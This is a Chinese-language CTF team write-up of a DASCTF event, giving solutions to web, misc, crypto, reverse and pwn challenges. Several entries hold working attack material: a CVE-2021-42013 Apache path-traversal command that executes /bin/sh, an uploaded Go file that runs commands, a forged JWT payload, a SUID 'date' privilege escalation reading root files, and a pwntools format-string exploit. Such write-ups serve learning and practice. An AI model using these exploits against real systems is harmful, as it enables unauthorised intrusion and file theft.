# 矛盾实验室 WriteUp 模板
# Nothing
矛盾实验室

# 排名
3 名

# 解题思路
## WEB
### Power Cookie 题
1.题目是Power Cookie，提示只有admin才可以获取flag，很明显了，是通过设置cookie来登录
2.BurpSuite抓包修改
payload
  cookie: admin=1
  
### 魔法浏览器 题
1.打开页面啥功能也没有，照例查看源代码，发现提示
let ua ="\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30 \x28\x57\x69\x6e\x64\x6f\x77\x73 \x4e\x54 \x31\x30\x2e\x30\x3b \x57\x69\x6e\x36\x34\x3b \x78\x36\x34\x29 \x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36 \x28\x4b\x48\x54\x4d\x4c\x2c \x6c\x69\x6b\x65 \x47\x65\x63\x6b\x6f\x29 \x4d\x61\x67\x69\x63\x2f\x31\x30\x30\x2e\x30\x2e\x34\x38\x39\x36\x2e\x37\x35";
2.转码后得到
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75
3.修改User-Agent即可
payload
  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75
  
### getme 题
1.打开后查看源代码有提示，<!--  pwd:/usr/local/apache2/ -->
2.提示里有apache，并且有路径，怀疑是路径穿越，搜了一下发现了CVE-2021-42013
3.试了一下payload，果然是这个漏洞，然后开始找flag，一开始找错方向了，浪费了一些时间。。。
payload
  curl -v --data "echo;cat /diajgk/djflgak/qweqr/eigopl/fffffflalllallalagggggggggg" 'http://node4.buuoj.cn:26865/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
  
### hackme 题
1.源代码有/list，访问看一下
2.processes中发现重要信息，Flag在根目录，且这些文件都是go文件，还有个uptime，知道需要上传go文件来执行获取flag
3.写一个go.go，返回Sorry there doesn't seem to be a go.go.go file，说明在上传的时候会自动filename后面加上.go，那么上传go文件，内容不变，再次访问go即可得到flag
payload
package main

import (
	"fmt"
	"os/exec"
)

func main() {
	cmd := exec.Command("cat", "/flag")
	ret, err := cmd.Output()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(string(ret))
}
### fxxkgo 题
1.https://blog.csdn.net/weixin_46081055/article/details/124201444 原题复现
2.id={{.}}&pw=123
X-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOnRydWV9.Lebcn5sry2QGKTbfbZ3pFhUvV9PNAvz0bj55K7IOaQg


## MISC
### 不懂PCB的厨师不是好黑客 题
1.linux下grep DASCTF
2.grep -r “DASCTF” ./

### 卡比 题
1.搜索kirby language，找到推特https://twitter.com/obscurekirby/status/1499761597039845377
2.对照得到PTRH{GWDVSWVQBFISZSZ}，用kirby当密码，得到DASCTF{imverylikekirby}

### rootme 题
1.连上之后按正常操作看一下suid，发现有个date很可疑（/bin/date）
2.百度搜索date提权，发现可以读文件
3.发现/usr/bin/date有s权限，因此直接读flag
date -f /root/flag.txt

### 神必流量 题
1.附件下载下来按大小排序，发现传输了一个压缩包
2.用16进制转储后cyberchef转换，并得到压缩包密码123456
3.得到一个链接https://drive.google.com/file/d/140MxBVh-OGvQUuk8tmOw4Xm8it9utIzo/view
4.下载下来也是123456，然后是go的exe，先直接对out进行分析
f = open('out.txt','rb').read()
s = 'DASCTF{'
for i in range(len(s)):
    print(f[i] - ord(s[i]))
print()
for i in range(len(s)):
print(f[i] ^ ord(s[i]))
5.在异或的时候，发现有个规律性54 54 48 51 54 54 48
6.猜测是54 54 48 51循环异或
f = open('out.txt','rb').read()
key = [54,54,48,51]
flag = ''
for i in range(len(f)):
    flag += chr(key[i%4]^f[i])
print(flag)

### 噪音 题
1.放进010中，发现其data有规律性
2.因此写一个脚本对data直接进行提取，编写脚本发现一共有16种不同的data值，猜测16进制，因此写个脚本按大小排序，输出后在最后发现flag，使用cyberchef转换，脚本如下
f = open('attachment.wav','rb').read()
data = []
for i in range(0,len(f),2):
	data.append(int.from_bytes(f[i:i+2], byteorder='little'))
set_data = data
set_data = list(set(set_data))
set_data.sort()
T = '0123456789abcdef'
for i in range(len(data)):
print(T[set_data.index(data[i])],end='')

## CRYPTO
### Yusa的密码学课堂——一见如故 题
1.魔改的Mt19937，关键在于逆rand函数，而实际上就是异或+循环移位
![image](https://github.com/furuanruan/CTF/blob/bc0d793400ac60103f6a692ffb7af0e293c68597/crypto.png)
2.太菜了，不会写，怎么办，用z3.
from gmpy2 import *
from Crypto.Util.number  import *
#from pwn import *
from binascii import *
from Crypto.Cipher import *


def cs2l(y, shift):
    return ((y << shift) ^ (y >> (32 - shift))) & 0xffffffff
def cs2r(y, shift):
    return ((y >> shift) ^ (y << (32 - shift))) & 0xffffffff
def f(y):
    y = y ^ cs2l(y, 11) ^ cs2l(y, 15)
    y = y ^ cs2r(y, 7) ^ cs2r(y, 19)
    return y
'''
from z3 import *

def solve(i):
    s=Solver()
    x=BitVec('x',33)
    s.add(f(x)==i)
    if s.check()==sat:
        y=int(str(s.model()[x]))
        assert  f(y)==i
        print(y)
        return y

fr=eval(open('output.txt','r').read())
Mt=[solve(i) for i in fr]
fw=open('Mt.txt','w')
fw.write(str(Mt))
fw.close()
'''

class Myrand():
    def __init__(self):
        self.index = 0
        self.isInit = 1
        self.MT =eval(open('Mt.txt','r').read())

    def generate(self):
        for i in range(624):
            y = (self.MT[i] & 0x80000000) + (self.MT[(i + 1) % 624] & 0x7fffffff)
            self.MT[i] = self.MT[(i + 397) % 624] ^ (y >> 1)
            if y & 1:
                self.MT[i] ^= 2567483520

    def rand(self):
        if self.index == 0:
            self.generate()
        y = self.MT[self.index]
        y = y ^ self.cs2l(y, 11) ^ self.cs2l(y, 15)
        y = y ^ self.cs2r(y, 7) ^ self.cs2r(y, 19)
        self.index = (self.index + 1) % 624
        return y

    def cs2l(self, y, shift):
        return ((y << shift) ^ (y >> (32 - shift))) & 0xffffffff

    def cs2r(self, y, shift):
        return ((y >> shift) ^ (y << (32 - shift))) & 0xffffffff
r=Myrand()
from hashlib import md5
flag = 'DASCTF{' + md5(str(r.rand()).encode()).hexdigest() + '}'
print(flag)
3.先用z3梭出对应的MT然后再直接调用类生成下一个随机数即可，得到flag

## REVERSE
### WER 题
1.做了挺久然后才发现是个签到题，在main函数调了很久，然后静态看了一眼函数表，想到之前的经验，有相关联的函数和一般会在main函数附近，然后真找到了。
![image](https://github.com/furuanruan/CTF/blob/1d1ab43eb7818c43d37bd3ce556e20991b075200/re1.png)
2.
enc=[0x05, 0x03, 0x55, 0x05,0x04, 0x07, 0x5E, 0x54,
     0x05, 0x07, 0x50, 0x02,0x03, 0x53, 0x5F, 0x50 ,0x53, 0x50, 0x53, 0x05,
     0x55, 0x00, 0x54, 0x55,0x57, 0x03, 0x05, 0x02,0x52, 0x50, 0x51, 0x53]
for i in range(len(enc)):
    print(chr(enc[i]^102),end='')
#ce3cba82ca6de596565c3f231ecd4675

## PWN
### gift 题
1.char buf[8]; // [rsp+10h] [rbp-B0h] BYREF
  void *ptr; // [rsp+18h] [rbp-A8h]
...
  puts("What's your name?");
  read(0, buf, 8uLL);
  printf("Hello %s,I prepare a gift to you.\n", buf);
  puts("Do you want it?");

2.通过读入8个长度的字符串可以泄露出flag的地址

3.read(0, s, 0x80uLL);
    if ( !strchr(s, 115) && !strchr(s, 83) )
    {
      printf(s);
      free(ptr);
      exit(0);
    }

4.这里给了格式化字符串漏洞但是我们不能直接使用%s打印flag。注意到题目给出了栈地址，考虑在栈上写数据，先预备好flag的地址，然后把rdi里面的%p利用%hhn覆写为%s，然后覆写printf结束时候的rip再次调用printf就可以打印出flag

5.from pwn import *

elf = ELF('./pwn')
context(arch = elf.arch, os = 'linux',log_level = 'debug')
# p = process('./pwn')
p = remote('node4.buuoj.cn',25049)

# target
p.sendafter("What's your name?",'a'*8)
p.recvuntil('a'*8)
target = u64(p.recv(6).ljust(8,'\0'))
log.success('target: 0x%x'%target)
# stack
p.sendlineafter('Do you want it?','Yes')
p.recvuntil('Here is your gift:')
leak = int(p.recvuntil('\n'),16)
log.success('leak: 0x%x'%leak)
# FS
payload = 'aaa%20$p%98c%21$hhn%100c%22$hhn'
payload = payload.ljust(0x40,'a')
#             target           rdi               rip
payload += p64(target) + p64(leak+0x27) + p64(leak-0x18)
p.sendlineafter('Now,to find your flag in the gift!\n',payload)

p.interactive()
